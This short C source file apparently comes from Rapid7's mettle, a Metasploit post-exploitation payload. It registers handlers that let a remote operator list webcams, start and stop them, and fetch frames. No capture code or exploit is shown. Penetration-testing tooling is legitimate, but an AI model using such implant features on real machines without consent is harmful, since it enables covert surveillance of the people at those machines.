/**
 * Copyright 2015 Rapid7
 * @brief Webcam API
 * @file webcam.c
 */

#include <endian.h>
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include <mettle.h>

#include "channel.h"
#include "log.h"
#include "tlv.h"
#include "webcam.h"

void webcam_register_handlers(struct mettle *m)
{
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);

#if HAVE_WEBCAM
	tlv_dispatcher_add_handler(td, "webcam_list", webcam_list, m);
	tlv_dispatcher_add_handler(td, "webcam_start", webcam_start, m);
	tlv_dispatcher_add_handler(td, "webcam_stop", webcam_stop, m);
	tlv_dispatcher_add_handler(td, "webcam_get_frame", webcam_get_frame, m);
#endif
}

